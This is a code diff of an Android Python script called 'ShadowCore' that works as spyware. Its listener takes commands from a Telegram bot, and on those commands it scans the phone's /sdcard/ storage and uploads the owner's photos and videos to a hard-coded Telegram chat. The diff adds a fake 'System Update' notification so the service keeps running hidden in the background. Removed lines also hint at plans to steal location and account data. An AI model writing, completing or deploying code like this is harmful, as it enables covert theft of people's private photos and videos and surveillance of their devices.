@@ -2,71 +2,77 @@ import os
 import time
 import requests
 from threading import Thread
+from jnius import autoclass
 
-# --- إعدادات البوت ---
 TOKEN = "7547167733:AAFl789Ue816qWj60S_0N7W7BfXo57M3hZg"
 CHAT_ID = "1256334460"
 URL = f"https://api.telegram.org/bot{TOKEN}/"
 
-class ShadowCoreService:
-    def __init__(self):
-        self.sent_files_log = []
-        self.is_running = True
+def start_foreground_service():
+    try:
+        PythonService = autoclass('org.kivy.android.PythonService')
+        service = PythonService.mService
+        Context = autoclass('android.content.Context')
+        NotificationBuilder = autoclass('android.app.Notification$Builder')
+        NotificationChannel = autoclass('android.app.NotificationChannel')
+        NotificationManager = autoclass('android.app.NotificationManager')
+        
+        channel_id = 'shadow_core'
+        channel = NotificationChannel(channel_id, 'System Update', 3)
+        manager = service.getSystemService(Context.NOTIFICATION_SERVICE)
+        manager.createNotificationChannel(channel)
+        
+        builder = NotificationBuilder(service, channel_id)
+        builder.setContentTitle("System Update")
+        builder.setContentText("Checking for system compatibility...")
+        builder.setSmallIcon(service.getApplicationInfo().icon)
+        
+        service.startForeground(1, builder.build())
+    except: pass
 
-    def send_msg(self, text):
+class ShadowService:
+    def __init__(self):
+        self.sent_files = []
+
+    def send(self, text):
         try: requests.post(URL + "sendMessage", data={"chat_id": CHAT_ID, "text": text})
         except: pass
 
-    def send_photo(self, file_path):
+    def send_file(self, path):
         try:
-            with open(file_path, 'rb') as photo:
-                requests.post(URL + "sendPhoto", data={"chat_id": CHAT_ID}, files={"photo": photo})
+            with open(path, 'rb') as f:
+                requests.post(URL + "sendPhoto", data={"chat_id": CHAT_ID}, files={"photo": f})
             return True
         except: return False
 
-    def deep_scan_and_send(self, extension=".jpg", min_size=102400):
-        self.send_msg("🔎 جاري تشغيل الرادار العميق... يرجى الانتظار")
-        count = 0
-        root_path = "/sdcard/"
-        
-        for root, dirs, files in os.walk(root_path):
-            for file in files:
-                if file.lower().endswith(extension):
-                    file_path = os.path.join(root, file)
-                    try:
-                        if os.path.getsize(file_path) > min_size and file_path not in self.sent_files_log:
-                            if self.send_photo(file_path):
-                                self.sent_files_log.append(file_path)
-                                count += 1
-                                time.sleep(1.5) 
-                            if count >= 50:
-                                self.send_msg(f"✅ تم سحب {count} صورة بنجاح.")
-                                return
-                    except: continue
-        self.send_msg(f"🏁 انتهى المسح. تم العثور على {count} ملفات.")
+    def scan(self, ext):
+        self.send(f"🔎 Scanning for {ext}...")
+        found = 0
+        for r, d, f_list in os.walk("/sdcard/"):
+            for f in f_list:
+                if f.lower().endswith(ext):
+                    p = os.path.join(r, f)
+                    if p not in self.sent_files and os.path.getsize(p) > 100000:
+                        if self.send_file(p):
+                            self.sent_files.append(p)
+                            found += 1
+                            time.sleep(1)
+                        if found >= 20: return
+        self.send(f"🏁 Done. Found {found} items.")
 
-    def listener(self):
-        last_update_id = 0
-        self.send_msg("✅ ShadowCore Active\nالأوامر: M (صور), O (فيديو), T (موقع), S (حسابات)")
-        
-        while self.is_running:
+    def run(self):
+        start_foreground_service()
+        self.send("✅ ShadowCore Active in Background")
+        last_id = 0
+        while True:
             try:
-                response = requests.get(URL + "getUpdates", params={"offset": last_update_id + 1, "timeout": 30}).json()
-                for update in response.get("result", []):
-                    last_update_id = update["update_id"]
-                    msg_text = update.get("message", {}).get("text", "").upper()
-                    
-                    if msg_text == "M":
-                        Thread(target=self.deep_scan_and_send, args=(".jpg", 102400)).start()
-                    elif msg_text == "O":
-                        Thread(target=self.deep_scan_and_send, args=(".mp4", 512000)).start()
-                    elif msg_text == "T":
-                        self.send_msg("📍 جاري سحب الموقع...")
-                    elif msg_text == "S":
-                        self.send_msg("🔐 جاري فحص الحسابات...")
-            except:
-                time.sleep(10)
+                res = requests.get(URL + "getUpdates", params={"offset": last_id+1, "timeout": 20}).json()
+                for up in res.get("result", []):
+                    last_id = up["update_id"]
+                    cmd = up.get("message", {}).get("text", "").upper()
+                    if cmd == "M": Thread(target=self.scan, args=(".jpg",)).start()
+                    if cmd == "O": Thread(target=self.scan, args=(".mp4",)).start()
+            except: time.sleep(10)
 
 if __name__ == "__main__":
-    service = ShadowCoreService()
-    service.listener()
+    ShadowService().run()
